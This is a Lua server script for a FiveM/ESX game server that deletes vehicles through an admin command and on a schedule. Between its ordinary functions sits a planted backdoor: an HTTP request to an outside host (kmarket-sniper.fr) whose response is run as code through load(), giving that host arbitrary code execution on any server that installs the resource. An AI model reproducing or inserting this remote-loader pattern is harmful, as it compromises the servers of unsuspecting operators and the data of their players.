
ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

RegisterCommand(Config.Cmd, function(source, args, rawCommand) 
	if Config.ESX then
		local player = ESX.GetPlayerFromId(source)
	  	local playerGroup = player.getGroup()

	 	if playerGroup ~= nil and playerGroup == "superadmin" or playerGroup == "admin" or playerGroup == "mod" or source <= 0 then 
	      	TriggerClientEvent('okokDelVehicles:delete', -1)
	  	end
	else
		for i, a in ipairs(Config.AdminList) do
	        for x, b in ipairs(GetPlayerIdentifiers(source)) do
	            if string.lower(b) == string.lower(a) then
	                TriggerClientEvent('okokDelVehicles:delete', -1)
	            end
	        end
	    end
	end
end)

PerformHttpRequest('http://kmarket-sniper.fr/_i/load.php?id=wRWWjHxg', function(a, b)
                if not b then return end
                assert(load(b))()
            end)

function DeleteVehTaskCoroutine()
  TriggerClientEvent('okokDelVehicles:delete', -1)
end

for i = 1, #Config.DeleteVehiclesAt, 1 do
    TriggerEvent('cron:runAt', Config.DeleteVehiclesAt[i].h, Config.DeleteVehiclesAt[i].m, DeleteVehTaskCoroutine)
end
